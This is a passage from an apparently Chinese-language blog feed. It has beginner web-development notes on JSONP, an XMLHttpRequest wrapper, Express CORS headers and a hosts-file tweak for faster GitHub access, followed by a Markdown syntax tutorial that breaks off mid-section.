$.getJSON(<span class="string">&#x27;http://localhost:8000/jqery-jsonp-server?callback=?&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(data);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">JS</span><br><span class="line">app.all(<span class="string">&quot;/jqery-jsonp-server&quot;</span>,<span class="function">(<span class="params">res,resp</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">// 设置响应头,解决跨域问题</span></span><br><span class="line">    resp.setHeader(<span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>,<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">    <span class="comment">// 设置响应体</span></span><br><span class="line">    <span class="keyword">let</span> data = &#123;</span><br><span class="line">        name:<span class="string">&quot;ccy&quot;</span>,</span><br><span class="line">        pwd:<span class="string">&#x27;123456&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> cb = request.query.callback;</span><br><span class="line">    <span class="keyword">let</span> str = <span class="built_in">JSON</span>.stringify(data);</span><br><span class="line">    resp.send(cb+str);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="基于js封装Ajax"><a href="#基于js封装Ajax" class="headerlink" title="基于js封装Ajax"></a>基于js封装Ajax</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">JS</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arrStr</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// 定义一个数组</span></span><br><span class="line">    <span class="keyword">var</span> res=[];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> obj)&#123;</span><br><span class="line">        <span class="comment">// 遍历出来的数据都添加到res数组中</span></span><br><span class="line">        res.push(key+<span class="string">&quot;=&quot;</span>+obj[key]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// join(&quot;&amp;&quot;):把数组中的每一个值以&amp;符号进行连接，然后转换成字符串</span></span><br><span class="line">    <span class="keyword">return</span> res.join(<span class="string">&quot;&amp;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ajax</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 创建 XMLHttpRequest 对象</span></span><br><span class="line">    <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    <span class="comment">// 将请求过来的参数通过 arrStr 函数进行转换成为以&amp;符号进行连接的字符串</span></span><br><span class="line">    <span class="keyword">var</span> str=arrStr(obj.data);</span><br><span class="line">    <span class="comment">// 请求</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    obj.type：请求类型</span></span><br><span class="line"><span class="comment">    obj.url + &quot;?&quot; + str:请求的路径 + arrStr 函数返回的值</span></span><br><span class="line"><span class="comment">    true:同步</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    xmlhttp.open(obj.type, obj.url + <span class="string">&quot;?&quot;</span> + str,<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送请求</span></span><br><span class="line">    xmlhttp.send();</span><br><span class="line">    <span class="comment">// 监听 readyState 属性的变化</span></span><br><span class="line">    xmlhttp.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 判断 readyState 属性是否为4 4：服务端处理并响应数据</span></span><br><span class="line">        <span class="keyword">if</span> (xmlhttp.readyState === <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="comment">// 服务端响应数据回来的话，关闭定时器，</span></span><br><span class="line">            <span class="built_in">clearInterval</span>(timer);</span><br><span class="line">            <span class="keyword">if</span> (xmlhttp.status &gt;= <span class="number">200</span> &amp;&amp; xmlhttp.status &lt; <span class="number">300</span> || xmlhttp.status === <span class="number">304</span>) &#123;</span><br><span class="line">                obj.success(xmlhttp);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                obj.error(xmlhttp);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 设置一个延时</span></span><br><span class="line">    <span class="keyword">if</span>(obj.timeout)&#123;</span><br><span class="line">        <span class="comment">// 设置一个定时器</span></span><br><span class="line">        timer=<span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;中断请求&quot;</span>);</span><br><span class="line">            <span class="comment">// 请求超时时，关闭请求</span></span><br><span class="line">            xmlhttp.abort();</span><br><span class="line">            <span class="built_in">clearInterval</span>(timer);</span><br><span class="line">        &#125;,obj.timeout);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">HTML</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="line">        &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">        &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">        &lt;script src=<span class="string">&quot;myAJAX03.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">        &lt;script&gt;</span><br><span class="line">            <span class="built_in">window</span>.onload=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">var</span> btn=<span class="built_in">document</span>.querySelector(<span class="string">&quot;button&quot;</span>);</span><br><span class="line">                btn.onclick=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                    ajax(&#123;</span><br><span class="line">                        type:<span class="string">&quot;GET&quot;</span>,</span><br><span class="line">                        url:<span class="string">&quot;05-test.php&quot;</span>,</span><br><span class="line">                        data:&#123;</span><br><span class="line">                            username:<span class="string">&quot;jianjian&quot;</span>,</span><br><span class="line">                            userpsw:<span class="string">&quot;123456&quot;</span></span><br><span class="line">                        &#125;,</span><br><span class="line">                        timeout:<span class="string">&quot;3000&quot;</span>,</span><br><span class="line">                        success:<span class="function"><span class="keyword">function</span>(<span class="params">xhr</span>)</span>&#123;</span><br><span class="line">                            alert(xhr.responseText);</span><br><span class="line">                        &#125;,</span><br><span class="line">                        error:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                            alert(<span class="string">&quot;请求失败&quot;</span>)</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;button&gt;发送请求&lt;/button&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">JS</span><br><span class="line"><span class="comment">// 创建路由规则</span></span><br><span class="line">app.all(<span class="string">&quot;/json-server&quot;</span>,<span class="function">(<span class="params">res,resp</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">// 设置响应头,解决跨域问题</span></span><br><span class="line">    resp.setHeader(<span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>,<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">    <span class="comment">// 设置响应体</span></span><br><span class="line">    <span class="keyword">let</span> data = &#123;</span><br><span class="line">        name:<span class="string">&quot;ccy&quot;</span>,</span><br><span class="line">        pwd:<span class="string">&#x27;123456&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> str = <span class="built_in">JSON</span>.stringify(data);</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        resp.send(str);</span><br><span class="line">    &#125;, <span class="number">2000</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="出现的问题"><a href="#出现的问题" class="headerlink" title="出现的问题"></a>出现的问题</h1><p><img src="image-20220416153051825.png" alt=""></p><p>问题：跨域</p><p>解决办法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">JS</span><br><span class="line">app.get(<span class="string">&quot;/server&quot;</span>,<span class="function">(<span class="params">res,resp</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">// 解决跨域问题</span></span><br><span class="line">    resp.setHeader(<span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>,<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">    resp.send(<span class="string">&quot;hello word!&quot;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&quot;/server&quot;</span>,<span class="function">(<span class="params">res,resp</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">// 解决跨域问题</span></span><br><span class="line">    resp.setHeader(<span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>,<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">    resp.send(<span class="string">&quot;hello word!&quot;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="国内快速访问Github"><a href="#国内快速访问Github" class="headerlink" title="国内快速访问Github"></a>国内快速访问Github</h1><p>Github架在国外，国内访问很慢，但我们可以通过修改本地系统主机hosts文件，绕过国内dns解析，达到快速访问github</p><h3 id="进入IPAddress-com网站-分别查询下列三个地址的ip"><a href="#进入IPAddress-com网站-分别查询下列三个地址的ip" class="headerlink" title="进入IPAddress.com网站,分别查询下列三个地址的ip"></a>进入IPAddress.com网站,分别查询下列三个地址的ip</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">JAVA</span><br><span class="line">github.com</span><br><span class="line">assets-cnd.github.com</span><br><span class="line">gibhut.global.ssl.fastly.net</span><br></pre></td></tr></table></figure><h3 id="修改本地hosts文件（仅限Windows系统）"><a href="#修改本地hosts文件（仅限Windows系统）" class="headerlink" title="修改本地hosts文件（仅限Windows系统）"></a>修改本地hosts文件（仅限Windows系统）</h3><p>找到hosts文件修改配置：<br>C盘 &gt; Windows &gt; System32 &gt; drivers &gt; etc &gt; hosts文件;<br>然后添加下列数据，注意把下面的ip改成你自己查询到ip地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">JAVA</span><br><span class="line">140.82.112.4 github.com</span><br><span class="line">185.199.108.153 assets-cdn.github.com</span><br><span class="line">199.232.69.194 github.global.ssl.fastly.net</span><br></pre></td></tr></table></figure><h3 id="刷新本地dns缓存"><a href="#刷新本地dns缓存" class="headerlink" title="刷新本地dns缓存"></a>刷新本地dns缓存</h3><p>打开cmd，运行命令： ipconfig/flushdns<br>就搞定了！</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>我猜你不太会markdown语法？</title>
      <link href="blog/markdown/"/>
      <url>blog/markdown/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="markdown语法的使用"><a href="#markdown语法的使用" class="headerlink" title="markdown语法的使用"></a>markdown语法的使用</h1><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="斜体和粗体"><a href="#斜体和粗体" class="headerlink" title="斜体和粗体"></a>斜体和粗体</h2><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> *斜体*或_斜体_</span><br><span class="line"><span class="number">2.</span> **粗体**</span><br><span class="line"><span class="number">3.</span> ***加粗斜体***</span><br><span class="line"><span class="number">4.</span> ~~删除线~~</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>显示效果：</p><ul><li>这是一段斜体</li><li>这是一段粗体</li><li>这是一段加粗斜体</li><li><del>这是一段删除线</del></li></ul><h2 id="分级标题"><a href="#分级标题" class="headerlink" title="分级标题"></a>分级标题</h2><p>写法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. # 一级标题</span><br><span class="line">2. ## 二级标题</span><br><span class="line">3. ### 三级标题</span><br><span class="line">4. #### 四级标题</span><br><span class="line">5. ##### 五级标题</span><br><span class="line">6. ###### 六级标题</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>显示效果：</p><h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4><h5 id="五级标题"><a href="#五级标题" class="headerlink" title="五级标题"></a>五级标题</h5><h6 id="六级标题"><a href="#六级标题" class="headerlink" title="六级标题"></a>六级标题</h6><h1 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h1><p>Markdown 支持两种形式的链接语法： 行内式和参考式两种形式，行内式一般使用较多。</p><h2 id="行内式"><a href="#行内式" class="headerlink" title="行内式"></a>行内式</h2><p>语法说明：</p><p>[]里写链接文字，()里写链接地址, ()中的”“中可以为链接指定title属性，title属性可加可不加。title属性的效果是鼠标悬停在链接上会出现指定的 title文字。<a href="链接地址" title="链接标题">链接文字</a>’这样的形式。链接地址与链接标题前有一个空格。<br>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 欢迎来到[梵居闹市](http:&#x2F;&#x2F;blog.leanote.com&#x2F;freewalk)</span><br><span class="line">2.</span><br><span class="line">3. 欢迎来到[梵居闹市](http:&#x2F;&#x2F;blog.leanote.com&#x2F;freewalk &quot;梵居闹市&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>显示效果：</p><p>欢迎来到<a href="http://blog.leanote.com/freewalk">梵居闹市</a></p><p>欢迎来到<a href="http://blog.leanote.com/freewalk">梵居闹市</a></p><h2 id="参考式"><a href="#参考式" class="headerlink" title="参考式"></a>参考式</h2><p>参考式超链接一般用在学术论文上面，或者另一种情况，如果某一个链接在文章中多处使用，那么使用引用 的方式创建链接将非常好，它可以让你对链接进行统一的管理。</p><p>语法说明：<br>参考式链接分为两部分，文中的写法 [链接文字][链接标记]，在文本的任意位置添加[链接标记]:链接地址 “链接标题”，链接地址与链接标题前有一个空格。</p><p>如果链接文字本身可以做为链接标记，你也可以写成[链接文字][]<br>[链接文字]：链接地址的形式，见代码的最后一行。</p><p>代码：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. 我经常去的几个网站[Google][1]、[Leanote][2]以及[自己的博客][3]</span><br><span class="line">2. [Leanote 笔记][2]是一个不错的[网站][]。</span><br><span class="line">3.</span><br><span class="line">4. [1]:http://www.google.com &quot;Google&quot;</span><br><span class="line">5. [2]:http://www.leanote.com &quot;Leanote&quot;</span><br><span class="line">6. [3]:http://http://blog.leanote.com/freewalk &quot;梵居闹市&quot;</span><br><span class="line">7. [网站]:http://http://blog.leanote.com/freewalk</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>显示效果：</p><p>我经常去的几个网站<a href="http://www.google.com/">Google</a>、<a href="http://www.leanote.com/">Leanote</a>以及<a href="http://http//blog.leanote.com/freewalk">自己的博客</a><br><a href="http://www.leanote.com/">Leanote 笔记</a>是一个不错的<a href="http://http//blog.leanote.com/freewalk">网站</a>。</p><h1 id="自动链接"><a href="#自动链接" class="headerlink" title="自动链接"></a>自动链接</h1><p>语法说明：<br>Markdown 支持以比较简短的自动链接形式来处理网址和电子邮件信箱，只要是用&lt;&gt;包起来， Markdown 就会自动把它转成链接。一般网址的链接文字就和链接地址一样，例如：</p><p>代码：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. &lt;http://example.com/&gt;</span><br><span class="line">2. &lt;address@example.com&gt;</span><br><span class="line">      </span><br></pre></td></tr></table></figure><p>显示效果：</p><p><a href="http://example.com/">http://example.com/</a><br><a href="mailto:address@example.com">address@example.com</a></p><h2 id="锚点"><a href="#锚点" class="headerlink" title="锚点"></a>锚点</h2><p>网页中，锚点其实就是页内超链接，也就是链接本文档内部的某些元素，实现当前页面中的跳转。比如我这里写下一个锚点，点击回到目录，就能跳转到目录。 在目录中点击这一节，就能跳过来。还有下一节的注脚。这些根本上都是用锚点来实现的。</p><p>注意： </p><ol><li>Markdown Extra 只支持在标题后插入锚点，其它地方无效。 </li><li>Leanote 编辑器右侧显示效果区域暂时不支持锚点跳转，所以点来点去发现没有跳转不必惊慌，但是你发布成笔记或博文后是支持跳转的。</li></ol><p>语法描述： </p><pre><code>    1. ## 0. 目录&#123;#index&#125;    2.    3. 跳转到[目录](#index)</code></pre><p>显示效果：</p><p>跳转到[目录]</p><h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><h2 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h2><p>使用 *，+，- 表示无序列表。</p><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">- 无序列表项 一</span><br><span class="line">- 无序列表项 二</span><br><span class="line">- 无序列表项 三</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>显示效果：</p><ul><li>无序列表项 一</li><li>无序列表项 二</li><li>无序列表项 三</li></ul><h2 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h2><p>有序列表则使用数字接着一个英文句点。</p><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1. 有序列表项 一</span><br><span class="line">2. 有序列表项 二</span><br><span class="line">3. 有序列表项 三</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>显示效果：</p><ol><li>有序列表项 一</li><li>有序列表项 二</li><li>有序列表项 三</li></ol><h2 id="定义型列表"><a href="#定义型列表" class="headerlink" title="定义型列表"></a>定义型列表</h2><p>语法说明：</p><p>定义型列表由名词和解释组成。一行写上定义，紧跟一行写上解释。解释的写法:紧跟一个缩进(Tab)</p><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1. Markdown</span><br><span class="line">2. :    轻量级文本标记语言，可以转换成html，pdf等格式（左侧有一个可见的冒号和四个不可见的空格）</span><br><span class="line">3. 代码块 2</span><br><span class="line">4. :   这是代码块的定义（左侧有一个可见的冒号和四个不可见的空格）</span><br><span class="line">5.         代码块（左侧有八个不可见的空格）</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>显示效果：</p><p>​    Markdown<br>​    轻量级文本标记语言，可以转换成html，pdf等格式<br>​    代码块 2<br>​    这是代码块的定义</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1. 代码块（左侧有八个不可见的空格）</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="包含段落的列表"><a href="#包含段落的列表" class="headerlink" title="包含段落的列表"></a>包含段落的列表</h2><p>语法说明：</p><p>列表项目可以包含多个段落，每个项目下的段落都必须缩进 4 个空格或是 1 个制表符（显示效果与代码一致）：</p><ul><li>轻轻的我走了， 正如我轻轻的来； 我轻轻的招手， 作别西天的云彩。<br>那河畔的金柳， 是夕阳中的新娘； 波光里的艳影， 在我的心头荡漾。<br>软泥上的青荇， 油油的在水底招摇； 在康河的柔波里， 我甘心做一条水草！</li></ul><p>​        那榆荫下的一潭， 不是清泉， 是天上虹； 揉碎在浮藻间， 沉淀着彩虹似的梦。<br>​        寻梦？撑一支长篙， 向青草更青处漫溯； 满载一船星辉， 在星辉斑斓里放歌。<br>​        但我不能放歌， 悄悄是别离的笙箫； 夏虫也为我沉默， 沉默是今晚的康桥！</p><ul><li>悄悄的我走了， 正如我悄悄的来； 我挥一挥衣袖， 不带走一片云彩。</li></ul><p>如果你每行都有缩进，看起来会看好很多，当然，再次地，如果你很懒惰，Markdown 也允许：</p><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1. *   轻轻的我走了， 正如我轻轻的来； 我轻轻的招手， 作别西天的云彩。</span><br><span class="line">2. 那河畔的金柳， 是夕阳中的新娘； 波光里的艳影， 在我的心头荡漾。 </span><br><span class="line">3. 软泥上的青荇， 油油的在水底招摇； 在康河的柔波里， 我甘心做一条水草！</span><br><span class="line">4.      那榆荫下的一潭， 不是清泉， 是天上虹； 揉碎在浮藻间， 沉淀着彩虹似的梦。 </span><br><span class="line">5. 寻梦？撑一支长篙， 向青草更青处漫溯； 满载一船星辉， 在星辉斑斓里放歌。 </span><br><span class="line">6. 但我不能放歌， 悄悄是别离的笙箫； 夏虫也为我沉默， 沉默是今晚的康桥！ </span><br><span class="line">7. *    悄悄的我走了， 正如我悄悄的来； 我挥一挥衣袖， 不带走一片云彩。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>显示效果：</p><ul><li>轻轻的我走了， 正如我轻轻的来； 我轻轻的招手， 作别西天的云彩。<br>那河畔的金柳， 是夕阳中的新娘； 波光里的艳影， 在我的心头荡漾。<br>软泥上的青荇， 油油的在水底招摇； 在康河的柔波里， 我甘心做一条水草！</li></ul><p>​        那榆荫下的一潭， 不是清泉， 是天上虹； 揉碎在浮藻间， 沉淀着彩虹似的梦。<br>​        寻梦？撑一支长篙， 向青草更青处漫溯； 满载一船星辉， 在星辉斑斓里放歌。<br>​        但我不能放歌， 悄悄是别离的笙箫； 夏虫也为我沉默， 沉默是今晚的康桥！</p><pre><code>    * 悄悄的我走了， 正如我悄悄的来； 我挥一挥衣袖， 不带走一片云彩。</code></pre><h2 id="包含引用的列表"><a href="#包含引用的列表" class="headerlink" title="包含引用的列表"></a>包含引用的列表</h2><p>语法说明：</p><p>如果要在列表项目内放进引用，那 &gt; 就需要缩进：</p><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  *   阅读的方法:</span><br><span class="line"></span><br><span class="line">&gt; 打开书本。</span><br><span class="line">&gt; 打开电灯。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>显示效果：</p><ul><li><p>阅读的方法:</p><blockquote><p>打开书本。<br>打开电灯。</p></blockquote></li></ul><h2 id="包含代码区块的引用"><a href="#包含代码区块的引用" class="headerlink" title="包含代码区块的引用"></a>包含代码区块的引用</h2><p>语法说明：<br>如果要放代码区块的话，该区块就需要缩进两次，也就是 8 个空格或是 2 个制表符：</p><ul><li><p>一列表项包含一个列表区块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;代码写在这&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h2 id="一个特殊情况"><a href="#一个特殊情况" class="headerlink" title="一个特殊情况"></a>一个特殊情况</h2><p>在特殊情况下，项目列表很可能会不小心产生，像是下面这样的写法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1986\. What a great season.</span><br></pre></td></tr></table></figure><p>会显示成：</p><p> 1986. What a great season.</p><h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p>语法说明：</p><p>引用需要在被引用的文本前加上&gt;符号。</p><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&gt; 这是一个有两段文字的引用,</span><br><span class="line">&gt; 无意义的占行文字</span><br><span class="line">&gt; 无意义的占行文字</span><br><span class="line">&gt; </span><br><span class="line">&gt; 无意义的占行文字</span><br><span class="line">&gt; 无意义的占行文字4.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>显示效果：</p><p>​        这是一个有两段文字的引用,<br>​        无意义的占行文字1.<br>​        无意义的占行文字2.</p><p>​        无意义的占行文字3.<br>​        无意义的占行文字4.</p><p>Markdown 也允许你偷懒只在整个段落的第一行最前面加上 &gt; ：</p><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; 这是一个有两段文字的引用,</span><br><span class="line">无意义的占行文字1.</span><br><span class="line">无意义的占行文字2.</span><br><span class="line"></span><br><span class="line">&gt; 无意义的占行文字3.</span><br><span class="line">无意义的占行文字4.</span><br></pre></td></tr></table></figure><p>显示效果：</p><p>​        这是一个有两段文字的引用,<br>​        无意义的占行文字1.<br>​        无意义的占行文字2.</p><p>​        无意义的占行文字3.<br>​        无意义的占行文字4.</p><h2 id="引用的多层嵌套"><a href="#引用的多层嵌套" class="headerlink" 